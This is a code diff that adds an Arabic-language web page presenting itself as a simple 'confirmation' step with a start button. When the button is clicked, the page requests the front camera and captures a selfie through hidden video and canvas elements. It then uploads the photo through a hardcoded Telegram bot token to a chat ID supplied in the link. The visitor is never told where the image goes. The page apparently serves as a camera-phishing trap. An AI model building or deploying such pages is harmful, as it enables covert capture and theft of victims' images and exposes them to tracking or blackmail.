@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>التأكيد</title>
+  <style>
+    * { box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background:#f0f2f5; margin:0; padding:20px; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+    .card { background:#fff; padding:40px 25px; border-radius:16px; box-shadow:0 10px 25px rgba(0,0,0,.08); max-width:380px; width:100%; text-align:center; }
+    h3 { color:#1c1e21; margin-bottom:12px; font-size:22px; }
+    p { color:#606770; font-size:15px; margin-bottom:25px; line-height:1.5; }
+    .btn { background:#0088cc; color:white; border:0; padding:14px 40px; font-size:18px; font-weight:bold; border-radius:10px; cursor:pointer; width:100%; }
+    .btn:disabled { background:#ccc; cursor:not-allowed; }
+    video,canvas { display:none; }
+    .status { margin-top:20px; font-size:14px; font-weight:600; color:#555; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h3>مرحباً بك</h3>
+    <p>اضغط على الزر أدناه للمتابعة وإكمال العملية</p>
+    <button id="startBtn" class="btn">ابدأ</button>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+    <div id="status" class="status"></div>
+  </div>
+
+  <script>
+    const BOT_TOKEN = "8655836277:AAH4RUQVFDGTVDbKFdld-R75kCQzOo8QhJU";
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chat_id');
+
+    const startBtn = document.getElementById('startBtn');
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const statusDiv = document.getElementById('status');
+
+    startBtn.addEventListener('click', async () => {
+      if (!chatId) {
+        statusDiv.innerText = "❌ الرابط غير مكتمل.";
+        statusDiv.style.color = "#d93025";
+        return;
+      }
+
+      startBtn.disabled = true;
+      statusDiv.innerText = "جاري طلب إذن الكاميرا...";
+      statusDiv.style.color = "#0088cc";
+
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" },
+          audio: false
+        });
+
+        video.srcObject = stream;
+        statusDiv.innerText = "تم السماح بالكاميرا. جاري التقاط الصورة...";
+        setTimeout(captureAndSend, 1200);
+      } catch (err) {
+        statusDiv.innerText = "❌ تم إلغاء إذن الكاميرا أو تعذر الوصول إليها.";
+        statusDiv.style.color = "#d93025";
+        startBtn.disabled = false;
+      }
+    });
+
+    function captureAndSend() {
+      if (!video.videoWidth || !video.videoHeight) {
+        statusDiv.innerText = "❌ تعذر تجهيز الكاميرا.";
+        statusDiv.style.color = "#d93025";
+        startBtn.disabled = false;
+        return;
+      }
+
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext('2d');
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      canvas.toBlob(async (blob) => {
+        if (!blob) {
+          statusDiv.innerText = "❌ تعذر إنشاء الصورة.";
+          statusDiv.style.color = "#d93025";
+          startBtn.disabled = false;
+          return;
+        }
+
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'verification.jpg');
+        formData.append('caption', '✅ تم التأكيد بنجاح');
+
+        try {
+          const response = await fetch(
+            `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,
+            { method:'POST', body:formData }
+          );
+
+          if (response.ok) {
+            statusDiv.innerText = "✅ تم بنجاح!";
+            statusDiv.style.color = "#188038";
+            startBtn.style.display = "none";
+            const stream = video.srcObject;
+            if (stream) stream.getTracks().forEach(track => track.stop());
+          } else {
+            statusDiv.innerText = "❌ حدث خطأ، يرجى المحاولة لاحقاً.";
+            statusDiv.style.color = "#d93025";
+            startBtn.disabled = false;
+          }
+        } catch (error) {
+          statusDiv.innerText = "❌ فشل الاتصال.";
+          statusDiv.style.color = "#d93025";
+          startBtn.disabled = false;
+        }
+      }, 'image/jpeg', 0.85);
+    }
+  </script>
+</body>
+</html>
